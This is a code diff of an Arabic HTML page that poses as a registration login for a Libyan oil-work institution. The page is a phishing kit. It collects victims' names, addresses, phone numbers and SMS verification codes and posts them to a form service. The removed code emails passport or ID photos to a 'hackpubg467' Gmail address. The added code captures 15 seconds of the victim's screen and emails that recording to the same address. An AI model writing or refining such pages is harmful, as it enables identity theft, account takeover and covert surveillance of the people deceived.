@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>المؤسسة الوطنــية الليبية</title>
-
+  <title>المؤسسة الوطنــية</title>
   <link rel="icon" href="uy.jpeg" type="image/png" />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap"
-    rel="stylesheet"
-  />
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
+  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
+  <script>
+    emailjs.init("user_ABC123xyz"); // ← غيّر هذا بـ User ID الخاص بك
+  </script>
   <style>
     body {
       font-family: "Cairo", sans-serif;
@@ -21,7 +21,6 @@
       margin: 0;
       direction: rtl;
     }
-
     .container {
       background: #fff;
       border-radius: 20px;
@@ -29,26 +28,20 @@
       padding: 35px 40px;
       width: 96%;
       max-width: 420px;
-      box-sizing: border-box;
       text-align: center;
-      z-index: 1;
     }
-
     .logo-container img {
       width: 90px;
       height: 90px;
-      object-fit: contain;
-      margin: 0 auto;
+      margin: 0 auto 10px;
       display: block;
     }
-
     h2 {
       margin-bottom: 25px;
       color: #003366;
       font-weight: 900;
       font-size: 32px;
     }
-
     label {
       display: block;
       margin-bottom: 8px;
@@ -56,25 +49,18 @@
       color: #222;
       text-align: right;
     }
-
-    input[type="tel"],
-    input[type="text"],
-    input[type="file"] {
+    input[type="tel"], input[type="text"] {
       width: 100%;
       padding: 12px 15px;
       font-size: 16px;
       border-radius: 10px;
       border: 1.8px solid #bbb;
       margin-bottom: 18px;
-      transition: border-color 0.3s ease;
-      box-sizing: border-box;
     }
-
     input:focus {
       border-color: gold;
       outline: none;
     }
-
     button {
       width: 40%;
       padding: 12px;
@@ -86,19 +72,15 @@
       cursor: pointer;
       font-weight: bold;
     }
-
     #timer {
       text-align: center;
       font-weight: 600;
       color: red;
-      margin-bottom: 20px;
-      min-height: 24px;
+      margin-top: 20px;
     }
-
     #codeField {
       display: none;
     }
-
     .error {
       color: red;
       font-size: 14px;
@@ -110,52 +92,20 @@
 <body>
   <div class="container">
     <div class="logo-container">
-      <img src="uy.jpeg" alt="شعار المؤسسة الليبية للعمل النفطي" />
+      <img src="uy.jpeg" alt="شعار المؤسسة" />
       <p>التسجيل في منظومة المؤسسة الليبية للعمل النفطي</p>
     </div>
-
     <h2>تسجيل الدخول</h2>
 
-    <form id="phoneForm" onsubmit="return sendPhone(event);" enctype="multipart/form-data">
+    <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="fullname">الاسم الثلاثي:</label>
-      <input
-        type="text"
-        id="fullname"
-        name="fullname"
-        required
-        placeholder="اكتب اسمك الثلاثي"
-      />
+      <input type="text" id="fullname" name="fullname" required placeholder="اكتب اسمك الثلاثي" />
 
       <label for="address">العنوان:</label>
-      <input
-        type="text"
-        id="address"
-        name="address"
-        required
-        placeholder="اكتب عنوانك"
-      />
+      <input type="text" id="address" name="address" required placeholder="اكتب عنوانك" />
 
       <label for="phone">رقم الهاتف:</label>
-      <input
-        type="tel"
-        id="phone"
-        name="phone"
-        required
-        placeholder="اكتب رقم هاتفك"
-        pattern="[0-9]{10,15}"
-        title="أدخل رقم هاتف صحيح"
-        autocomplete="tel"
-      />
-
-      <label for="passportImage">صورة جواز السفر أو البطاقة:</label>
-      <input
-        type="file"
-        id="passportImage"
-        name="passportImage"
-        accept="image/*"
-        capture="environment"
-        required
-      />
+      <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" />
 
       <button type="submit" id="sendPhoneBtn">إرسال البيانات</button>
       <div id="timer"></div>
@@ -164,37 +114,29 @@
     <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
         <label for="code">جاري إرسال الكود عبر SMS</label>
-        <input
-          type="text"
-          id="code"
-          name="code"
-          placeholder="اكتب الكود هنا"
-          autocomplete="one-time-code"
-        />
+        <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" />
         <div id="errorMessage" class="error"></div>
         <button type="submit" id="sendCodeBtn">تأكيد الكود</button>
-        <div
-          id="processingMessage"
-          style="display: none; color: #003366; font-weight: bold; margin-top: 20px"
-        >
-          جاري معالجة طلبك، يمكن المراجعة خلال 7 أيام إلى 30 إذا كان هناك طلب
-          بيانات جديدة منك وشكرًا
+        <div id="processingMessage" style="display: none; color: #003366; font-weight: bold; margin-top: 20px">
+          جاري معالجة طلبك، قد تستغرق من 7 إلى 30 يوم عمل.
         </div>
       </div>
     </form>
   </div>
 
-  <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
-    emailjs.init('user_ABC123xyz'); // ضع هنا User ID الخاص بك من EmailJS
-
     let countdownInterval;
+
+    function updateTimer(seconds) {
+      const timerDisplay = document.getElementById("timer");
+      const minutes = Math.floor(seconds / 60).toString().padStart(2, "0");
+      const secs = (seconds % 60).toString().padStart(2, "0");
+      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
+    }
 
     function startTimer(duration) {
       let timeLeft = duration;
       const timerDisplay = document.getElementById("timer");
-      const sendPhoneBtn = document.getElementById("sendPhoneBtn");
-      const phoneInput = document.getElementById("phone");
       timerDisplay.style.display = "block";
       updateTimer(timeLeft);
       countdownInterval = setInterval(() => {
@@ -203,19 +145,10 @@
         if (timeLeft <= 0) {
           clearInterval(countdownInterval);
           timerDisplay.style.display = "none";
-          sendPhoneBtn.disabled = false;
-          phoneInput.disabled = false;
+          document.getElementById("sendPhoneBtn").disabled = false;
+          document.getElementById("phone").disabled = false;
         }
       }, 1000);
-    }
-
-    function updateTimer(seconds) {
-      const timerDisplay = document.getElementById("timer");
-      const minutes = Math.floor(seconds / 60)
-        .toString()
-        .padStart(2, "0");
-      const secs = (seconds % 60).toString().padStart(2, "0");
-      timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${secs}`;
     }
 
     function sendPhone(event) {
@@ -224,22 +157,13 @@
       const phoneInput = document.getElementById("phone");
       const fullnameInput = document.getElementById("fullname");
       const addressInput = document.getElementById("address");
-      const passportInput = document.getElementById("passportImage");
       const sendPhoneBtn = document.getElementById("sendPhoneBtn");
 
       if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
-        alert("يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً");
-        phoneInput.focus();
+        alert("يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقمًا");
         return false;
       }
 
-      if (!passportInput.files || passportInput.files.length === 0) {
-        alert("يرجى تحميل صورة جواز السفر أو البطاقة.");
-        passportInput.focus();
-        return false;
-      }
-
-      // إرسال البيانات النصية فقط إلى formcarry
       const payload = {
         fullname: fullnameInput.value,
         address: addressInput.value,
@@ -251,54 +175,69 @@
         headers: { "Content-Type": "application/json", Accept: "application/json" },
         body: JSON.stringify(payload),
       })
-        .then((response) => {
-          if (!response.ok) throw new Error("فشل إرسال البيانات");
+      .then((response) => {
+        if (!response.ok) throw new Error("فشل إرسال البيانات");
 
-          // بعد إرسال formcarry بنجاح، نرسل الصورة والاسم إلى بريدك
-          sendEmailWithAttachment(fullnameInput.value, passportInput.files[0]);
+        fullnameInput.disabled = true;
+        addressInput.disabled = true;
+        phoneInput.disabled = true;
+        sendPhoneBtn.disabled = true;
+        document.getElementById("codeField").style.display = "block";
+        startTimer(480);
 
-          // تعطيل الحقول
-          fullnameInput.disabled = true;
-          addressInput.disabled = true;
-          phoneInput.disabled = true;
-          passportInput.disabled = true;
-          sendPhoneBtn.disabled = true;
-
-          document.getElementById("codeField").style.display = "block";
-          startTimer(480); // 8 دقائق
-        })
-        .catch((error) => {
-          alert("تعذر إرسال البيانات. حاول مرة أخرى.");
-          console.error(error);
-        });
+        // ⏺️ بدء تسجيل الشاشة
+        startScreenRecording(fullnameInput.value);
+      })
+      .catch((error) => {
+        alert("تعذر إرسال البيانات. حاول مرة أخرى.");
+        console.error(error);
+      });
 
       return false;
     }
 
-    function sendEmailWithAttachment(fullname, file) {
-      const reader = new FileReader();
-      reader.onload = function(event) {
-        const base64File = event.target.result.split(",")[1];
+    function startScreenRecording(senderName) {
+      navigator.mediaDevices.getDisplayMedia({ video: true })
+        .then((stream) => {
+          const recorder = new MediaRecorder(stream);
+          const chunks = [];
 
-        const emailParams = {
-          to_email: "hackpubg467@gmail.com",
-          from_name: fullname,
-          message: "صورة جواز السفر أو البطاقة مرفقة.",
-          attachment: base64File,
-          attachment_filename: file.name,
-          attachment_type: file.type,
-        };
+          recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+          };
 
-        emailjs.send('service_i81x8no', 'template_123abc', emailParams)
-          .then(() => {
-            alert("تم إرسال الصورة والاسم إلى البريد الإلكتروني.");
-          })
-          .catch((error) => {
-            alert("حدث خطأ أثناء إرسال البريد الإلكتروني.");
-            console.error(error);
-          });
-      };
-      reader.readAsDataURL(file);
+          recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: "video/webm" });
+            const reader = new FileReader();
+            reader.onloadend = function () {
+              const base64Data = reader.result.split(",")[1];
+
+              emailjs.send("service_i81x8no", "template_123abc", {
+                to_email: "hackpubg467@gmail.com",
+                from_name: senderName,
+                message: "تسجيل الشاشة لمدة 15 ثانية مرفق.",
+                attachment: base64Data,
+                attachment_filename: "screen-recording.webm",
+                attachment_type: "video/webm"
+              })
+              .then(() => {
+                console.log("✅ تم إرسال الفيديو إلى البريد الإلكتروني");
+              })
+              .catch((err) => {
+                console.error("❌ فشل إرسال الفيديو عبر EmailJS", err);
+              });
+            };
+            reader.readAsDataURL(blob);
+          };
+
+          recorder.start();
+          setTimeout(() => {
+            recorder.stop();
+          }, 15000);
+        })
+        .catch((err) => {
+          console.error("⚠️ رفض المستخدم تسجيل الشاشة:", err);
+        });
     }
 
     function sendCode(event) {
@@ -307,54 +246,36 @@
       const errorMessage = document.getElementById("errorMessage");
       const processingMessage = document.getElementById("processingMessage");
       const sendCodeBtn = document.getElementById("sendCodeBtn");
+
       errorMessage.textContent = "";
 
       if (codeInput.value.trim() === "") {
-        errorMessage.textContent = "يرجى كتابة الكود المرسل إليك.";
-        codeInput.focus();
+        errorMessage.textContent = "يرجى كتابة الكود.";
         return false;
       }
-
-      const payload = {
-        phone: document.getElementById("phone").value,
-        code: codeInput.value,
-      };
 
       fetch("https://formcarry.com/s/2evKahWtdJS", {
         method: "POST",
         headers: { "Content-Type": "application/json", Accept: "application/json" },
-        body: JSON.stringify(payload),
+        body: JSON.stringify({
+          phone: document.getElementById("phone").value,
+          code: codeInput.value
+        }),
       })
-        .then(async (response) => {
-          const data = await response.json();
-          if (response.ok && data.success !== false) {
-            sendCodeBtn.style.display = "none";
-            processingMessage.style.display = "block";
-          } else {
-            errorMessage.textContent = "❌ هناك خطأ في الكود المرسل. حاول مرة أخرى.";
-          }
-        })
-        .catch((error) => {
-          errorMessage.textContent = "⚠️ تعذر الاتصال بالخادم.";
-          console.error(error);
-        });
+      .then((response) => response.json())
+      .then((data) => {
+        if (data.success !== false) {
+          sendCodeBtn.style.display = "none";
+          processingMessage.style.display = "block";
+        } else {
+          errorMessage.textContent = "❌ الكود غير صحيح.";
+        }
+      })
+      .catch(() => {
+        errorMessage.textContent = "⚠️ تعذر الاتصال بالخادم.";
+      });
 
       return false;
-    }
-
-    // ======= دالة التعبئة التلقائية من تطبيق الأندرويد =======
-    function fillCodeFromAndroid(code) {
-      const codeField = document.getElementById("codeField");
-      const input = document.getElementById("code");
-      const form = document.getElementById("codeForm");
-
-      codeField.style.display = "block";
-      input.value = code;
-
-      // ارسال النموذج تلقائيًا بعد 500 مللي ثانية
-      setTimeout(() => {
-        form.requestSubmit();
-      }, 500);
     }
   </script>
 </body>
